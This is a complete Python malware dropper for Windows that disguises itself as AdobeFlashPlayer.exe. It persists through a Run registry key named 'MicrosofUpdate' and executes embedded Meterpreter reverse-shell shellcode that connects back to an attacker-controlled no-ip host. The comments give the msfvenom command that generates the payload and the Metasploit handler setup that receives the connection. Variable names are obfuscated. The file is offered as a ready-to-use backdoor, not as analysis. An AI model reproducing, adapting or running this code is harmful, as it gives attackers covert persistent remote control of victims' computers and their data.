#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import os.path
import platform
import time
import shutil
import sys
import threading
import win32api, win32con
import win32event, winerror
from _winreg import *
from ctypes import *
# Generate a shellcode
# use: msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=YOURNOIP.no-ip.org LPORT=YOURPORT -b '\x00\x0a\x0d\x40' -f c
# HANDLER MsfConsole
"""
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp_dns
set LHOST 0.0.0.0 # YOUR LAN IP HERE
set LPORT 0000 # YOUR PORT HERE
set ExitOnSession false
exploit -j -z
"""
## -- DIRECTORY FOR EXPLOIT -- ##
dir = "C:\\Users\\Public\\Libraries\\AdobeFlashPlayer.exe" ## -- AdobeFlashPlayer.exe replaces it with a name of your choice -- ##
## -- END - DIRECTORY FOR EXPLOIT -- ##
def startup():
    shutil.copy(sys.argv[0],dir)
    aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"MicrosofUpdate",0, REG_SZ, dir)	
## -- HERE's YOUR SHELLCODE -- ##
buf =  ("\xbd\x41\xb8\xbd\xa0\xda\xd2\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x5a\x31\x6e\x12\x83\xee\xfc\x03\x2f\xb6\x5f\x55\x53\x2e\x1d"
"\x96\xab\xaf\x42\x1e\x4e\x9e\x42\x44\x1b\xb1\x72\x0e\x49\x3e"
"\xf8\x42\x79\xb5\x8c\x4a\x8e\x7e\x3a\xad\xa1\x7f\x17\x8d\xa0"
"\x03\x6a\xc2\x02\x3d\xa5\x17\x43\x7a\xd8\xda\x11\xd3\x96\x49"
"\x85\x50\xe2\x51\x2e\x2a\xe2\xd1\xd3\xfb\x05\xf3\x42\x77\x5c"
"\xd3\x65\x54\xd4\x5a\x7d\xb9\xd1\x15\xf6\x09\xad\xa7\xde\x43"
"\x4e\x0b\x1f\x6c\xbd\x55\x58\x4b\x5e\x20\x90\xaf\xe3\x33\x67"
"\xcd\x3f\xb1\x73\x75\xcb\x61\x5f\x87\x18\xf7\x14\x8b\xd5\x73"
"\x72\x88\xe8\x50\x09\xb4\x61\x57\xdd\x3c\x31\x7c\xf9\x65\xe1"
"\x1d\x58\xc0\x44\x21\xba\xab\x39\x87\xb1\x46\x2d\xba\x98\x0e"
"\x82\xf7\x22\xcf\x8c\x80\x51\xfd\x13\x3b\xfd\x4d\xdb\xe5\xfa"
"\xb2\xf6\x52\x94\x4c\xf9\xa2\xbd\x8a\xad\xf2\xd5\x3b\xce\x98"
"\x25\xc3\x1b\x0e\x75\x6b\xf4\xef\x25\xcb\xa4\x87\x2f\xc4\x9b"
"\xb8\x50\x0e\xb4\xd1\xee\xb1\xbb\x21\x8f\xdf\xdf\x49\x2b\x53"
"\x4c\xec\xdc\xf0\xe8\x89\x4a\x93\xde\x07\xe5\x76\x76\xa8\xd7"
"\xe7\xfa\x2f\x27\xa0\xa2\xf7\x7f\x08\x0b\x50\x27\xf0\xf3\x38"
"\x8f\x58\x5c\xe1\x77\x01\x04\x49\xdf\xe9\xec\x31\x87\x51\x55"
"\x9a\x6f\x3a\x3d\x42\xd7\xe2\xe5\x2a\xbf\x4a\x4e\xcb\x57\xc2"
"\x46\xff\x27\xeb\x42\x74\x67\x08\x07\x8e\x37\x58\xd5\x90\xac"
"\xc0\x50\x76\xb8\xe0\x34\x20\x54\x98\x1c\xba\xc5\x65\x8b\xc6"
"\xc5\xee\x38\x36\x8b\x06\x34\x24\x7b\xe7\x03\x16\x2d\xf8\xb9"
"\x3d\xd1\x6c\x46\x94\x86\x18\x44\xc1\xe0\x86\xb7\x24\x7b\x0e"
"\x22\x87\x13\x6f\xa2\x07\xe3\x39\xa8\x07\x8b\x9d\x88\x5b\xae"
"\xe1\x04\xc8\x63\x74\xa7\xb9\xd0\xdf\xcf\x47\x0f\x17\x50\xb7"
"\x7a\xa9\xac\x6e\x42\xdf\xdc\xb2");
## -- AND - HERE's YOUR SHELLCODE -- ##	
ajsJABHSjajNJjNJ = create_string_buffer(buf, len(buf))
hshajIYReRyVSKsl = cast(ajsJABHSjajNJjNJ, CFUNCTYPE(c_void_p))
if os.path.isfile(dir) == False:
    startup()
else:
	print "Erro"
## http://www.tutorialspoint.com/python/python_date_time.htm
time.sleep(50) # Wait Initialization of the network card 
# 
hshajIYReRyVSKsl()	
	